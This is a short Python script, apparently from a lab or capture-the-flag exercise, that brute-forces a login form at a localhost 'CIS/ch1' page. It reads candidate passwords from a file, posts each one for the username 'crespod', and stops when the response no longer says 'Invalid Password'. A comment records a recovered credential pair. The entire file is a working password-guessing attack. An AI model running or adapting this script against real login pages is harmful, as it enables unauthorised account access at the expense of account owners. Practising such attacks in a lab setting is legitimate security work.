import requests

passwords = open("users.txt", 'r').read().split('\n')

def Ch1(url, password):
    data = {
        "username": "crespod",
        "password": password,
        "login": "Login"
        }
    req = requests.post(url, data).text
    if "Invalid Password" in req:
        print(f"Invalid Password ===> {password}")
    else:
        print(f"Valid Password ===> {password}") #crespod : rollyg
        exit()

url = "http://localhost/CIS/ch1/login.php"
for password in passwords:
    Ch1(url, password)
